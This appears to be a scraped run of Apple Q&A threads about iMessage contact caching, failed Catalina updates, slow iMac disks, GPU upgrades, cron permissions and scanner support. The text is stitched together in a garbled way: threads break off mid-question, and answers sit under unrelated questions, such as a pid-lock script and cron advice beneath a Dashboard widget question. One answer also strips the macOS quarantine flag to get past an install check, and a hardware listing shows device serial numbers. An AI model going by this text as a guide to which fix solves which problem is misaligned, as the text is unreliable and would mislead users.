I had a second phone that was not an iPhone and in my personal contact card on my main phone, I had the second phone number added as an additional entry for mobile number.  So my contact card \"MyName\" had my main mobile number and a second number in it.  When I would loan my second phone to my daughter, it would appear as though I was texting myself but it was fine for the time.  \nNow I've moved the SIM card from the temp phone and put it into an older iPhone and now that phone and number are officially my daughter's phone.  I removed the second phone number from my contact card and created a new contact card \"Daughter\" with that phone number on it.  \nThe problem is that when I text to \"Daughter\", as soon as the message finishes sending, it switches to show that it is \"MyName\" instead of \"Daughter\" and it's back to looking like I'm texting with myself.  I've confirmed that my daughter's phone number doesn't show up in my contact card and that my number doesn't show up in hers.  And I've confirmed that on the phone contacts as well as in iCloud.com just to be sure nothing is hanging around there.  I've tried doing this iMessage off and on and I get the same result.  \nMy daughter's phone doesn't have any confusion - it shows \"MyName\" when received from me.  It's only my phone that is confused showing \"MyName\" when coming from my daughter's phone.  When I tap on the name (and then the \"i\" and then the arrow next to the name) for a message received from my daughter, it shows my whole contact card and does not include the her phone number in that list.  Clearly something is cached somewhere but I can't figure out where that would be to clear it out.  Any suggestions short of clearing out my phone and starting over?   \nAdditional Info:  I just tried calling from my daughter's phone and my phone showed my daughter's contact info on the incoming call.  I also tried calling from my phone to my daughter's phone and it showed her info on the outgoing call.  So the phone app has the right contact info but the Messages app is where the problem is.  \n\nA: Months later, with no better answers in sight, I decided to try deleting my own contact card (where \"Daughter\"'s number had been used as mine at one point but had since been removed).  I'd been trying to be more surgical about the problem and wanted to avoid this big hammer.  It solved the problem.  \nThe detailed steps I took are below.  Some of the steps are probably unnecessary but I really didn't want to take a chance.  And you could probably do it fine without needing MacOS Contacts connected through iCloud but I found it made it easier to reimport and know I got exactly my contact info back the way it was (and I don't know how I would have done that just within iOS).  \n\n\n*\n\n*Started with iMessage off on the phone but iCloud active for\nContacts on both phone and MacOS\n\n*In linked Contacts on MacOS, exported my own card - the one with the\nproblem - to the Desktop as a vcf file\n\n*On the phone, deleted my own contact; verified it went away from my\nMacOS contacts through iCloud sync\n\n*On the phone sent message to Daughter; confirmed it stayed saying\n\"Daughter\"\n\n*On MacOS, imported my vcf file into Contacts; confirmed the card\nreappeared on the phone through iCloud sync\n\n*On the phone sent message to Daughter; confirmed it stayed saying\n\"Daughter\"\n\n*On MacOS, used the Card -> Make This My Card; confirmed that the\nsilhouette showed up on my card on the phone through iCloud sync (discovered you have to not have your own contact open on the phone for this to sync)\n\n*On the phone sent message to Daughter; confirmed it stayed saying\n\"Daughter\"\n\n*Turned on iMessage on the phone and accepted connection on MacOS\n for the phone number\n\n*On the phone sent message to Daughter; confirmed it stayed saying\n \"Daughter\"\n\n", "Q: How to improve into vim of MacOS Mojave the speed of vertical scroll with bottom/up keys?

In fact lots of things aren't described either, including Terminal's window geometry (the more text is shown at once, the more CPU cycles it'd be needed to scroll it), Terminal's active profile (some of them are slimmer and others have somewhat complex graphics thanks to additional effects — \"Silver Aerogel\" is one example).\nI use homebrew's version of Vim and can tell that its scrolling is quite fast (at least there's no slowness) both in Terminal and in iTerm2.\nHence, a few suggestions that logically follows:\n\n\n*\n\n*Try changing either Vim or terminal (or both).\n\n*Try using GUI version (gvim) and compare its scrolling performance.\n\n\nYou can give a try to Activity Monitor's CPU monitoring (with shortest update interval possible) to see if it shows any major CPU consuming processes during scrolling in Vim.\n", "Q: Where can I find dashboard widgets on OS Catalina?

Did Apple remove Dashboard on OS Catalina? If not, where can I find it? Thanks a lot! \nEdit: \nSeems like dashboard is removed from OS Catalina (thanks to the comment linking to other similar questions!), Is there any way to put dashboard widgets on desktop like it's shown in this video? \nUPDATE: \nIs there a way to get the Converter Tool somehow? (the widget that can convert currency, length, pressure, weight all in one!) Recommendation of similar Apps is welcomed too! \n\nA: Dashboard nor Widgets are available in macOS 10.15 Catalina.

I have no clue why that is, but it may be related to permissions to mail the output.\n\nA: The traditional UNIX way of preventing a program from having multiple copies running is with a .pid (or lock) file. The following example appears on multiple places:\n#!/bin/sh\n\nNAME=$(basename \"$0\")\n\nif [ -f /var/run/\"$NAME.pid\" ] &&\n  ps -p $(cat /var/run/\"$NAME.pid\") >/dev/null 2>&1\nthen\n   echo \"Script is currently in progress... aborting...\"\n   exit 3\nfi\n\n# Remove the .pid file on exit (by setting a trap)\ntrap 'rm -f /var/run/\"$NAME.pid\"' EXIT\n\n# Echoes the current PID to the .pid file\necho $$ > /var/run/\"$NAME.pid\"\n\nThe downside is that you'd need to move your commands into script files.\nDisclaimer: you still need to figure out why the programs don't exit as they should, but this allows you to, at least, not overtax your system. You can also opt yo kill the offending PID instead of exiting the newly started script.\n\nA: Have you granted full disk access to your cron executable?\n\n\n*\n\n*On Catalina, how can a cronjob get permission to touch files on a USB disk?\nSystem Preferences needs to allow that task to write and read for most use cases.

I am a musician, and was finding my 2011 iMac was getting sluggish with more complex tracks. It was topping out the CPU so I bought a second hand 2015 iMac with a much more powerful CPU. I am finding that the new machine is actually considerably worse in performance than the older one. Activity monitor reveals that there is plenty of CPU time and physical memory available. The problem seems to occur whenever I try to do more than one thing at a time which requires any amount of disk access. As I type this, my Dropbox has just started syncing, and the performance of the machine has degraded to the extent that I am typing, and the letters are appearing slowly one at a time on the page. If I try to open a piece of software while another one is doing anything, the whole system grinds to a halt, I get a persistent beachball, and software will start to freeze and/or crash entirely. Despite this, Activity Monitor continues to assert that there is no problem CPU or memory-wise. So I did a disk benchmark and was surprised at how low the results were: \n\nDragging and dropping that image into Safari from my Desktop, by the way, required me to wait for Exposé to redraw (and it stuttered rather than swishing smoothly), click and drag the file, un-Exposé and wait again, drag the file into Safari, then wait for the beachball to stop before letting go. From experience, if I drag and drop without waiting for the beachball to stop, the Mac ignores the drag and drop and I have to do it again.\nOpening my Applications directory can take several minutes. Opening music project files? I go and make tea while it thinks about it. It is so bad that I have actually put the older 2011 iMac back into the studio as this new one is completely unusable. It has been like this since I got it. When I bought it I erased the HDD and installed Mojave from scratch. It has always been this slow—it has not degraded over time.\nThis is clearly not the expected performance for this machine, so if the CPU and memory aren't causing the problem, could it be that the hard drive is either so slow as to bottleneck the performance, or is failing?\nHardware Overview:\n\n  Model Name:   iMac\n  Model Identifier: iMac16,2\n  Processor Name:   Intel Core i5\n  Processor Speed:  2.8 GHz\n  Number of Processors: 1\n  Total Number of Cores:    4\n  L2 Cache (per Core):  256 KB\n  L3 Cache: 4 MB\n  Memory:   8 GB\n  Boot ROM Version: 229.0.0.0.0\n  SMC Version (system): 2.32f20\n  Serial Number (system):   C02SF1JTGG77\n  Hardware UUID:    C3F0A7B9-1498-5EA2-94D2-B1CBE28C6E50\n\nAPPLE HDD HTS541010A9E662:\n\n  Capacity: 1 TB (1,000,204,886,016 bytes)\n  Model:    APPLE HDD HTS541010A9E662               \n  Revision: JA0AB5D0\n  Serial Number:    JD8002D81S8JRD\n  Native Command Queuing:   Yes\n  Queue Depth:  32\n  Removable Media:  No\n  Detachable Drive: No\n  BSD Name: disk0\n  Rotational Rate:  5400\n  Medium Type:  Rotational\n  Partition Map Type:   GPT (GUID Partition Table)\n  SMART status: Verified\n  Volumes:\nEFI:\n  Capacity: 209.7 MB (209,715,200 bytes)\n  File System:  MS-DOS FAT32\n  BSD Name: disk0s1\n  Content:  EFI\n  Volume UUID:  0E239BC6-F960-3107-89CF-1C97F78BB46B\ndisk0s2:\n  Capacity: 1 TB (999,995,129,856 bytes)\n  BSD Name: disk0s2\n  Content:  Apple_APFS\n\n\nA: I am experiencing something similar \"upgrading\" from a 2011 MacBook Air with SSD to a 2017 iMac 4K with 1TB 5400 disk (same disk as yours). \nThe read and write speeds looks what you could expect from such drive. \nYou could try reboot into safe mode to see if there is any difference. \nAnother solution is to buy an external SSD to hook up via USB/Thunderbolt for your project files.\n", "Q: Confusion regarding Mac Pro graphic cards I have an eraly 2008 Mac Pro 3,1 and I'm interested in upgrading its graphic capabilities. It currently has an ATI Radeon HD 2600 XT. I have looked online for compatible graphics cards but I'm confused regarding compatibility. For example, the GTX 770 is said to be compatible for the Mac I have if flashed, but I don't understand how that works. Is any GTX 770 available on the market compatible off the bat? Would I need to flash it? Is it possible to keep the graphics card I curently have and add the other one?\n\nA: Which version of macOS runs on your MacPro? I believe 10.11 is the last version that the cMP3,1 supports... Anyways, if you plan on using the Mojave Patcher I would recommend getting a GTX680. If you really can't live without a bootscreen I would recommend looking at flashing tutorials for NVIDIA GPUs. There are a few on YouTube (esp. GTX680) and macrumors is also a good source. You could also buy a flashed card from MacVidCards, but they are a bit pricey..\nI don't miss the EFI Screen on my MacPro 5.1 with an unflashed RX580.\nGood Luck!\n\nA: I’d definitely look at what MacVidCards has to say. \nAs you’re theoretically stuck on El Capitan & the 3,1 isn’t particularly fast by today’s standards I wouldn’t look at going too high end.\nI’d also definitely consider whether you need the boot screen before even thinking about unflashed cards. Without you have no recourse to recovery or FileVault. \nYou can keep the old card in & swap to it in emergency, though personally I wouldn’t leave it in to save sweating the ageing PSU, just keep it in case. \nApple’s own highest offering is the ATI HD 5770, which I have in a couple of old Pros here. I’m also happily running an HD7950 in a 4,1 though I’ve never tried it in the 3. \nNVidia cards suffer if you ever need to run Mojave (using unsupported hack) as there are no drivers other than Apple’s,so no CUDA etc. \n", "Q: Using Finder to copy files by value instead of the files' reference I want to copy a few files from one directory of a git repository branch to another branch that doesn't have the files. With Windows, you can copy the files and they are saved to the clipboard as they are, such as passing the actual files to some temporary directory. This allows you to delete the original files and still paste them elsewhere; basically a cut operation. I know Mac OS doesn't have the ability to cut files, so I assume that is why when I copy files from branch A, checkout branch B, and try to paste the files to the same directory for branch B, the paste option is grayed out; the files that were being referenced no longer exist to be copied.\nIs there a way to enable a temporary directory where all copied items aren't simply references to the items that are being copied?\n\nA: The git-checkout command is used to \"checkout\" files into your current branch from another branch. This would be safest since it would all remain in version control:\ngit checkout <branch_name> -- <paths>\n\nExample,\ngit checkout develop\ngit checkout master\ngit checkout develop -- myfile.js\n\nwould checkout myfile.js from develop into master so you can commit it when ready.\n", "Q: Inkscape like tool in Mac with latex rendering capabilities I'm looking for some Inkscape \"like\" application for MacOS where you can insert latex text/symbols and modify your figures to some extent.

Actually, two of them, both Apple keyboards -- one wireless and the other USB. Both of them, and the internal keyboard, stopped working at that point. When I re-connected a keyboard, it continued working again (only the reconnected one).\n\nA: This appears to be a Karabiner bug (at least in my case).\n\nA: Here are a couple of workarounds in the form of an answer so people can find them easily, since this Karabiner bug is still bugging us actively:\n1. Disable Caps Lock key (so it doesn't happen)\n\nMacOS System Preferences > Keyboard > Modifier Keys... and here set Caps Lock to No Action\n\nOne easy workaround is to simply disable the Caps Lock key entirely, if that is an acceptable option for you.\nIf you have to yell around the Internets a lot, try the next one:\n2.

Before upgrading to Catalina, everything works fine. After the upgrade, the internal keyboard will randomly freeze while typing (no response, caps lock light won't change). The trackpad and touchbar still works after the keyboard freezes. Pressing Fn will still change the touchbar. External keyboard works if plugged in after the internal one freezes. The   only way to unfreeze the keyboard seems to be restarting (also the only way to dim out the capslock light).

I just opened my mac after two years of having it to clean it. Opened it carefully, and found out that the plastic base holding the batteries seems broken where the screws are... is this possible due to heat or something?\nIt is not a used (well it's two years old but I'm the first owner) or refurbished.\n\n\nA: I see this in MacBook Airs, and similarily in MacBook Pros (2012 and earlier non-retina), all the time. It is in my judgement simple material fatigue.\nThe battery in the MBAs are held down with 5 screws, in MBPs with 2 or 3. The retainer plastic around these screws are thin and therefore relatively weak, which means they are prone to breakage due to mechanical stress. They are stressed from the downward screw pressure, and will get additionally stressed from the bumps happening in normal use, which will induce a mechanical force on the battery relative to the screws. There is nothing more to it. The temperature in these, especially in the corners of the MBAs, do not rise enough to cause the plastic to become brittle.\nThis breakage might have been a contributing factor to why Apple has switched to holding the batteries in place with glue instead. I have seen a couple of instances where a piece of this retainer plastic has come loose and lodged itself in the CPU fan, stopping it cold.\n", "Q: Catalina Notes.app draining battery?

Hooray!\n\nBONUS: Back Up Your Notes\nI was reluctant to try this method because I was terrified that I would introduce some sync problem and wipe out my notes. As Apple provides no easy way to make a local backup/export of your notes, I felt that this was a reasonable worry. \nEventually, I found this little utility that makes .txt files (with HTML inside) of all of your notes (WARNING: it omits any images or attached files). It ain't great, but it worked and helped to put me at ease.\nApple also provides a way of downloading your iCloud data on their Data and Privacy site… which I initiated, but have yet to receive the download link.

The usual method to boot to recovery is to hold down ⌘-R immediately after a power-up or reboot. Disk Utility will then become available through the Recovery mode GUI.\nThis site claims that the conversion will be non-destructive when done through Recovery mode.

It kept restarting (it's like the Kernal panic countdown started getting shorter to the point where it wouldn't even reach the login screen. After a few restarting, it showed a ''prohibitory sign'', after 30 seconds it shut off. I tried booting into Recovery mode but no luck.

If the problem persists, and your observations are correct, then you have a hardware error with your iMac. You should contact Apple or the dealer for repairs. You can also use the built-in hardware test to search for errors, but be aware that it only catches a small subset of possible errors.\nThe reason I say this is that when you boot into Internet Recovery, it is not using any information from your macOS installation or from your hard drive in general. If that kernel panics during boot, you have a hardware problem.\nThere are many possible reasons as to why this seems to only affect macOS and not Windows in Bootcamp. You could be lucky that you're not hitting the faulty hardware, and it could be that Windows in general does not use that portion of the hardware - or that flaws in that piece of hardware is inconsequential for Windows (or at least you haven't noticed the problem yet).\nThe actual defective hardware could be many things, but it is often faulty RAM or similar component. The hard drive is not used for Internet Recovery, but there's a small chance that a defective hard drive could interfere anyways - however, in that case you shouldn't be able to run Windows from the same drive.\n", "Q: How to delete kexts in Catalina?

I've been thinking of lots of different ways to have the code translate multiple numbers (binary), but everything I try doesn't seem to work. I'm relatively new to AppleScript, and I'm pretty stumped.

There aren't a great many options for easily allowing multiple values to be obtained from a user.  But it looks like you're experimenting with binary/text encoding of data, and that these binary numbers likely represent 8 bits of a single byte of data, therefore it seems reasonable to let a user supply as many bytes of data he wishes in a single input dialog, simply separating each binary value by a space, e.g.\n\"1011010 11010011 01011000 ...\"\n\nwhich would represent three bytes of data in binary form that are easy to split into individual items and converted one-by-one.\nTo this end, it makes sense to put the chunk of code that does the base conversion inside a handler (function) that can be re-used again and again to perform as many conversions as one needs without having to write out identical code again and again.\nHere's a draft of a script that does all of this:\nset bytes to every word in the text returned of ¬\n    (display dialog \"Binary Input:\" with icon note ¬\n    buttons {\"Cancel\", \"Convert\"} default button 2 ¬\n    with title \"Binary to Text Conversion\")\n\nset chars to {} -- this will fill with each decimal conversion\n\nrepeat with bits in bytes\n     -- call the handler below\n    set end of chars to the decimal from bits\nend repeat\n\n-- Now convert the decimal numbers to text\nreturn character id chars\n\n# A handler that takes a binary number and returns its decimal\n# representation.

What to do now?\n\nA: This is a risky proposition, but it’s what I would do if I was in your position. Obviously I cannot test it myself. Use at your own risk, etc.\n\n\n*\n\n*This is a highly important step!!!  Make a backup of your iPhone, either to iTunes or to iCloud. (Ideally, both.) If iTunes, be sure to set an encryption password.\n\n*Reset the device: Settings > General > Reset > Erase All Content and Settings.\n\n*When it restarts, don’t bother configuring anything, just skip through the setup steps as quickly as possible.\n\n*Run the update.\n\n*When the update is complete, run Settings > General > Reset > Erase All Content and Settings again.\n\n*Restore iPhone from backup.\nThat should give you your current setup but with the new version of iOS.\nUnfortunately, some things do not carry over after a restore, so you will have to reconfigure some apps, but I think it’s the best chance that you have.\nIf you want to try a less-drastic option…\nI would recommend going to Settings > General > iPhone Storage and looking at which apps are taking up the most space. Deleting them manually might help.\n\nA: Don't do it!  iOS 13 breaks the iPhone 6s in important ways.  \n\n\n*\n\n*Mail doesn't work properly. Some messages don't download at all, mail\nretrieval is very slow, and sometimes only the message header is\ndownloaded. \n\n*Battery life is reduced by about 25 percent (my\nguesstimate, I have to hook up a charger at least three times a day).\n\n*The new sharing UI is defective.  Often when I try to share via\ne-mail I get a message box.  The fields are completely blank.  And I\ncan't type in it.\n\n\nBest,\nTony\n", "Q: How do I Reauthorize Screen Sharing for Quicktime? At some point, I must have denied Quicktime access to screen sharing.  Now that I want to record a Screen Recording, I need to grant it permission again however, when I go to System Preferences to do this, Quicktime does not appear as one of the options to check.  Where did it go?  Is Quicktime holding a grudge because I denied it previously?  How do I Reauthorize Quicktime for Screen Sharing?\n\n\nA: You can reset the screen recording permissions for QuickTime Player using tccutil:\ntccutil reset ScreenCapture com.apple.QuickTimePlayerX\n\nAfter running this command, you need to quit QuickTime Player (if it was open). Then open QuickTime Player again and choose \"New Screen Recording...\" from the File menu. That will cause the prompt dialog to pop up again so you can grant permission for Screen Recording.\n\nA: Quitting and restarting Quicktime several times seems to have made it a selectable option in System Preferences.  Once it was selected/checked I was able to perform a screen recording with Quicktime.\n\nA: Running a tccutil reset command did not help me. No apps appeared in the Screen Recording list, as shown in the screen shot of the original poster, and I couldn't figure out how to add them back. \nNic, who posted about a similar situation, suggested that I create a new login user account and log in there, and then get QuickTime Player to record the screen in the new account. This worked for me. Here's what I did:\nStarting in my main user account, I created a User 2 account with admin privileges and then switched accounts. In the new account, I launched QuickTime as well as a couple other relevant apps (screen shot and screen sharing apps). Each time I did that, I got the usual prompts to allow Screen Recording access and those apps finally appeared in the list so that I could check them. \nWhen I finally switched back to my regular user account, those permissions were retained, so that I could finally run QuickTime and make screen recordings. \nHope this works for you too.\n\nA: My solution for this, was open QuickTime, start a recording, tried to give permission and if I didn't see Quicktime there I closed QuickTime and repeated the process a lot of times until it appeared in System preferences.\n", "Q: Disadvantages of using sim card from old iPhone? I upgraded from an iPhone 5 to XS. the 5 had a mobile-carrier company sim card (non-apple). To save phonecalls, I just plugged in the old sim card into new phone and it worked. I think the new phone has a apple sim card. The sim card that came with the new phone looks newer and more shiny. Are there any disadvantages of sticking with the old sim card? Everything seems like it works. I was just wondering because many but one android user sent me an text message and it didn't go through. The 5 underwent submersion but the water damage detector didn't register water damage. \n\nA: In terms of using the phone day to day, there's no disadvantages with re-using the SIM card from the old phone.\nThe disadvantage lies primarily with the fact that if you had requested a new SIM card from your provider, you would have received one that could be running newer software (inside the SIM card). This could be relevant if you were the target of a specific hacking attempt, as the SIM card software is rarely, if at all, updated by providers after it is sent out.\n", "Q: Cannot install JDK 13.01 on Catalina I tried to install the x64 version of jdk (from https://www.oracle.com/technetwork/java/javase/downloads/jdk13-downloads-5672538.html), however, Apple refused to install it saying that the software needs to be updated.\nSince this is the latest version of JDK, what should I do in order to install java without waiting for the next update from Oracle?\n\n\nA: Just run\nxattr -d com.apple.quarantine jdk-13.0.1_osx-x64_bin.dmg\n\nto remove the download quarantine flag attribute. \nAs per Utsav T's comment, it is important to unmount and remount the installer (jdk-13.0.1_osx-x64_bin.dmg) to make sure that the installer works correctly. \nAfter removing the quarantine flag attribute, install as usual.\n\nA: You can install it via Homebrew.\n\n*\n\n*Install Homebrew.\n\n*Install Java with Homebrew by running\n\nbrew install --cask java\n\nNote the installation path in the output, it should be something like\n\n==> Moving Generic Artifact 'jdk-13.0.1.jdk' to '/Library/Java/JavaVirtualMachines/openjdk-13.0.1.jdk'.\n\n\n\n*Remove quarantine status from the just installed Java SDK by running\n\nxattr -r -d com.apple.quarantine /Library/Java/JavaVirtualMachines/openjdk-13.0.1.jdk\n\n(don't forget to replace the the path to JDK with the installation path from step 2, as the JDK version might change.)\n\nA: *\n\n*Open \"System Preference\".\n\n*Go to \"Security & Privacy\" then \"General\" tab\n\n*Click on the lock icon then enter the password.\n\n*There will be a button \"Always Allow\" to allow \"jdk-13.0.1\".

It could not be verified first time around. Restarted. Update not found. Restarted again and retried a number of times but still no luck.\nStupidly followed these instructions as I was getting desperate and thought they might apply to the standard Catalina installation. They did not (I should have noticed 'beta' in the URL.)\nThis had the effect of macOS Catalina no longer being available through Software Update. Only macOS Catalina Beta:\n\nI ran sudo softwareupdate --clear-catalog as instructed here, which removed macOS Catalina Beta, but now I'm apparently all up-to-date on Mojave. \nEven attempting to download the Catalina installer through the App Store gives me this error message through Software Update:\n\nIs there any solution here? I'm getting the feeling my only solution here is an OS reinstall.\nThanks!\n\nA: You don’t have to erase your current OS to make a new Catalina volume and install it cleanly.\n\n\n*\n\n*How much space do I need to make a bootable Catalina volume on my Mojave Mac?\nOnce you get the version you want installed, you can migrate over the data or not as you please.\nThis saves you from having to erase first to test the install / get ready to erase the old OS that’s stuck in beta land.\n\nA: If just removing the Beta profile in System Settings does not work, try to unenroll from the Beta Program: https://beta.apple.com/sp/betaprogram/login_to_unenroll#macos. \nThis immediately resolved the problem for me.\n", "Q: How do I unlock an old iPad with Activation Lock without knowing the Apple ID password? I want to start using my old iPad again. I forgot my old Apple ID and the iPad is stuck on the activation lock screen after resetting it to factory settings. I used a different Apple ID for my iPad and iPhone, so I don't remember the password. I don't remember the answers to the security questions. I cannot change the password for this account. The iPad is running iOS 9.\nI have looked into some shady internet tips recommending an app to unlock it, but the app doesn't work when activation lock is on.\n\nA: Apple has the following information on their page for Activation Lock for iPhone, iPad, and iPod touch:\n\nIf you forget your Apple ID or password Your Apple ID is the account\n  that you use to sign in to all Apple services. Usually, your Apple ID\n  is your email address. If you forget your Apple ID, we can help you\n  find it.\nIf you forget your password, you can reset it from your device or your\n  Apple ID account page.\nIf you can't find your Apple ID or reset your password, you'll lose\n  access to your account and might be unable to use or reactivate your\n  device. To help prevent this, visit your Apple ID account page\n  periodically to review and update your account information.\n\nUnfortunately, you are probably out of luck.\nSince your iPad was unused and running iOS 9, it's probably pretty old and may not be worth any money in Apple's Trade-in Program as a non-functioning device, but can be recycled free of charge. (Nation-specific recycling programs can be found here). Other people or companies may be willing to purchase non-functioning devices for parts.\n", "Q: Brother Scanner does not work with macOS Catalina I have a Brother MFC-8890 DW.\nWhen I upgraded to macOS Catalina, my Scanner Control Center 2 software does not work. Printer works.\nBrother site says go to use the iPrint&Scan software, but this model is not supported.\n\nA: \n\"The Brother ControlCenter2 is not supported by macOS v10.15.\nUse the Brother iPrint&Scan as an alternative function.\"\nSource Brother macOS Catalina Support Statement\n\nControl Center was a 32-bit application that Catalina wont run. Update MFC-8890 DW drivers provided at Brother website for 10.15 support.\n\nA: For those of you how landed here looking for a way to scan files on other Brother devices that were discontinued in Catalina (10.15+), you can verify if ICA driver is still available for your scanner and use the Image capture built-in macOS app instead of Brother's ControlCenter.\n", "Q: On Catalina, how can a cronjob get permission to touch files on a USB disk? I have a USB disk, that takes ages to spin up after it has gone to sleep. So in the past I used either a cron job to regularly touch a file on it, so it will never spin down.\n*/5 * * * * /usr/bin/touch /Volumes/xxx/touch.txt >/tmp/stdout.log 2>/tmp/stderr.log\n\nOnly since Catalina, these jobs get a touch: /Volumes/xxx/touch.txt: Operation not permitted.\nWhen I use the same command in the console, it works nicely.\nI had to grant the terminal access full disk access. Is there a similar restriction on this cron task?\n\nA: You need to grant cron full disk access. Drag /usr/sbin/cron into the Full Disk Access area in System Preferences > Security & Privacy > Privacy tab.\nSource: https://twitter.com/DaveWoodX/status/1184235412509941761\n", "Q: How do Apple Enterprise certificates and their expiration dates work? I have a question that I wanted clarity on. As shown below, I have an Apple Enterprise account that has a membership expiration date of March 13, 2020\n\nAnd within that membership, I have a Enterprise certificate that expires 2020/06/21, and another that expires 2022/10/01\n\nThis means that any provisioning profiles that I create will have to fit between now and a year out.  \nSo if I make a provisioning profile that is linked to the certificate that expires 2020/06/21, given this is less than a year, the provisioning profile will expire on the same day the certificate expires (2020/06/21).  So this would be a bad idea.  However, a provisioning profile linked to the 2nd license of 2022/10/01, would expire a year from today-1.  So it would expire Oct 15, 2020.  This is the better idea.\nAnd …. if I do not pay the membership fee of $299 on March 13, 2020 though, will both the certificates above also expire.  I would assume so.\nIs my understanding correct?\n\nA: Edit:  I don’t know about enterprise certs what i said applies to normal developers but my understanding is that it is the same.\nCertificate ls always expire in the date they say they will expire.  Your provisioning profile isn’t really important, you can delete and create them at will when ever you want. If you do not renew the $299 you cannot generate a new cert after your renew date.  Which means you won’t be able to create provisioning profiles either.\nYou can create new certs and provisioning profiles as often as you would like until your membership ends so these dates don’t really mean much. If both expire and you are still a member just create new ones.\n", "Q: I got a rock stuck in my charging port for my iPhone and my charger won’t go into the hole I need ways to get it out please? Rock stuck in charging port from park is st the end of the port and I don’t know how to get it out\n\nA: If you can't get it out with fine tipped tweezers, you can try a tooth pick and super glue.  Put a tiny amount on the tip of the toothpick.  Then touch the tip of it to the stone, and hold it there until it sets.  Then pull it out.  I don't recommend this if you can't insert the toothpick without touching the inside walls of the charging port, though.\n", "Q: \"PKDownloadError error 8\" upon Catalina update How do I resolve this? Error was encountered on a 2018 MacBook Air.\n\n\nA: My co-worker and I encountered the same thing on our 2018 MacBook Pro (13-inch, Four Thunderbolt 3 Ports) computers.\nI found that I needed to restart my computer in Safe Mode (hold Shift key during restart) and then I was able to complete the download and install of Catalina.\nMy coworker's solution: It turns out that having Cisco AnyConnect installed on the computer interferes with the installation somehow.  My coworker used the Cisco AnyConnect Uninstaller to remove the program, ran the installer again successfully, and then re-installed Cisco AnyConnect.\n\nA: First solution:\nIt is reported that this error occurs during the installation of macOS Catalina if the Internet connection is interrupted or disconnected.\nMake sure that the Mac has an active wi-fi or ethernet connection and that the Internet works as expected, and then try to install macOS Catalina again.\nSecond solution\nThe Recovery Mode installer of Catalina appears to not be able to properly partition the drive. \nInstall High Sierra or earlier macOS from Recovery Mode and then upgrade to Catalina or install Catalina (or High Sierra) from a bootable drive.\n\nA: I was having this error using a Catalina installer on a USB key I made with createinstallmedia. Using this method, the installer shouldn't have to download anything, so a 'download' error didn't make sense.\nPurpose: Encrypting and clearing drive in order to return the computer to seller.\nPrep work: After encrypting drive, I deleted the old APFS container with Terminal, then I formatted the drive as a single APFS volume named 'Macintosh HD'.\nInstallation: After beginning the installation, the bar would begin to fill with '3 minutes remaining'. Once it got to about 80%, it said '2 minutes remaining' and it would hold up. A minute or so sitting there and it would give the same error stated above. I retried this a few times.\nFix: I turned off WiFi (completely disconnected from Internet). After doing this, the installation completed as expected.\nSuspicions:\nThe installer app I used was downloaded 3 weeks prior to using it. These do have a short 'expiration' period. Usually resetting the clock to be right after the original download time fixes that issue, but it did not fix it here. Still, communication with Apple's servers or an attempt to download an updated utility could have notified the installer of a discrepancy and forced an error.\n\nA: I have been pulling my hair out with the same problem over the past few days, and have isolated the PKDownloadError error 8 issue - I was able to solve this via 2 methods:\n\n\n*\n\n*use my iPhone's hotspot as the wifi for the update (note: this is\nslower AND may be very expensive depending on your cellphone plan)\n\n*change the DNS settings on my home router to OpenDNS\n(https://use.opendns.com/), allowing me to use my home internet\n(faster & cheaper)\n\n\nA: I faced the same error with a brand new installation, I don't know about your case. You can reboot your mac then hold the \"option key\". You will see a select box to select a wi-fi network after that the recovery by the internet will start. That way you can install a version before Catalina. In my case was Sierra. Then after the new installation, you can update to Catalina!\n\nA: For what it is worth, this had to have been a content filter issue for me.  I have prepped 2 new Macs, a 2019 Air and a 2019 MBP, and got this error on both my wired and wireless networks.\nI was able to plug the same devices on edge connections (read: less restrictive internet connections) and the install went through with no issue.\nIf I had time, I would try to see what resource was being blocked, but at least for now, I know what was causing the error and how to get past it.\nAustin\n-Network Administrator @ a large 9-12 Educational Institution\n\nA: Just solve this problem.\nStep 1 Backup just in case. You can backup your important files to the cloud or everywhere you prefer.\nStep 2 Move the downloaded installer to the Trash.\nStep 3 Shut down your Mac.\nStep 4 Turn it on and immediately press and hold these four keys together: Option, Command, P, and R. You can release the keys after about 20 seconds, during which your Mac might appear to restart. On Mac computers that play a startup sound, you can release the keys after the second startup sound. [This is NVRAM reset!]\nStep 5 Go to the App Store, find Catalina, and download again.\nStep 6 Follow the instruction and wait for like 30 minutes. Now you should get the new macOS.\nIf the error still pops up, change to another network connection.\n\nA: I had this same PKDownload error in November 2020 when trying to d/l Big Sur.  I spent close to 5 hours with Apple Support, being bumped up to the Apple Senior Enginer level of help.\nI was told that this error is a Network Error.  Long story short, we never solved the problem, but do read on.\nI go the PK error on my 2015 iMac running Catalina.  I then went to my wife's brand new 2019 MB Pro:  same download error.\nThe only thing in common between the two Macs was the router and so, on a hunch, took the MB Pro next door, logged onto my neighbor's WiFi, and successfully downloaded and installed Big Sur.\n\nA: In my case I had to change my firewall settings in my router from average to low.\n", "Q: Will an iPhone work and still have regular warranty if it's bought outside your country? I did my research and some sources are saying there wouldn't be warranty if your iPhone is bought outside your home country. But I don't know if that rule still applies now. \nI want to buy online on the US apple store 'cause its waaay cheaper than where I reside now.\n\nA: If your country has an official Apple store, then yes (warranty covers) but it will not be valid if your country has only the official Apple Reseller store. \nYou must have a proper purchase bill and verify that you own that hardware, then Apple Store will take care of it. In my case, I had purchased my iPhone in Finland and I was able to get a warranty here in Spain too. \nOffical statement from Apple:\nNo Apple reseller, agent, or employee is authorized to make any modification, extension, or addition to this Warranty. If any term is held to be illegal or unenforceable, the legality or enforceability of the remaining terms shall not be affected or impaired.

I wanted to add a comment but don't have enough reputation (any advice on how to better approach this is welcome).\nBack to the issue at hand, on my 13\" 2019 Retina MBA I can see the same problem. It is as if we're pressing a magic combo which seems to trigger a debugging session of sorts.

On this system, being a 2-core one, the CPUs go up to 100% and sit there while these processes run and do their thing. I had to resort to some shell magic to kill these to make it stop faster.\nI have also asked a friend to press the combo on a 2016 MBP and I can confirm the system did the same thing, screen blinking, footprint process running, etc.\nDoes anyone have an idea on being able to reclaim this shortcut?\n", "Q: macOS Catalina - can't mount external hdd - verification/reading of the omap object failed: Illegal byte sequence I have an external hard drive with 3 partitions, and one has given up the ghost.

